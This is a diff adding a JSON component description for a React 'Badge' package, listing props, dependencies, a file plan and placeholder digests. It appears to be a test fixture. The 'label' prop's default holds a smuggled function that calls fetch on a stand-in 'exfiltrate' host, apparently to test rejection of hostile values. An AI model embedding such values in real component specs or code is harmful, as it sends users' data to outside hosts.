@@ -1,0 +1,107 @@
+{
+  "kind": "ComponentIR",
+  "schemaVersion": 1,
+  "identity": {
+    "componentName": "Badge",
+    "componentSlug": "badge",
+    "packageName": "@anvilkit/badge",
+    "packageVersion": "0.1.0"
+  },
+  "props": [
+    {
+      "name": "label",
+      "puckField": "text",
+      "type": "string",
+      "default": {
+        "$function": "() => fetch('https://example.invalid/exfiltrate')"
+      },
+      "required": true,
+      "control": "text",
+      "description": "Badge text"
+    },
+    {
+      "name": "count",
+      "puckField": "number",
+      "type": "number",
+      "default": "0",
+      "required": false,
+      "control": "number",
+      "description": "Optional counter"
+    },
+    {
+      "name": "tone",
+      "puckField": "select",
+      "type": "\"info\" | \"success\" | \"warning\"",
+      "default": "\"info\"",
+      "required": false,
+      "control": "select",
+      "description": "Color tone"
+    },
+    {
+      "name": "rounded",
+      "puckField": "radio",
+      "type": "boolean",
+      "default": "true",
+      "required": false,
+      "control": "toggle",
+      "description": "Pill shape"
+    }
+  ],
+  "slots": [],
+  "composition": [],
+  "variants": [],
+  "states": [],
+  "responsive": [],
+  "tokens": [],
+  "assets": [],
+  "motion": {
+    "presets": [],
+    "reducedMotion": true
+  },
+  "accessibility": {
+    "role": "region",
+    "aria": [],
+    "keyboard": [],
+    "contrastPolicy": "wcag-aa"
+  },
+  "dependencies": [
+    {
+      "packageName": "react",
+      "versionRange": ">=19",
+      "source": "allowlist"
+    },
+    {
+      "packageName": "@puckeditor/core",
+      "versionRange": "^0.23",
+      "source": "allowlist"
+    }
+  ],
+  "catalogLineage": [],
+  "content": [],
+  "filePlan": [
+    {
+      "path": "src/config.ts",
+      "generator": "model"
+    },
+    {
+      "path": "src/Badge.tsx",
+      "generator": "model"
+    },
+    {
+      "path": "src/styles.css",
+      "generator": "model"
+    },
+    {
+      "path": "package.json",
+      "generator": "scaffold"
+    }
+  ],
+  "generation": {
+    "generatorVersion": "component-generator-0.1.0",
+    "contractBomDigest": "sha256:1111111111111111111111111111111111111111111111111111111111111111",
+    "catalogDigest": "sha256:2222222222222222222222222222222222222222222222222222222222222222",
+    "brandSnapshotDigest": "sha256:3333333333333333333333333333333333333333333333333333333333333333",
+    "policyDigest": "sha256:4444444444444444444444444444444444444444444444444444444444444444"
+  },
+  "version": 1
+}
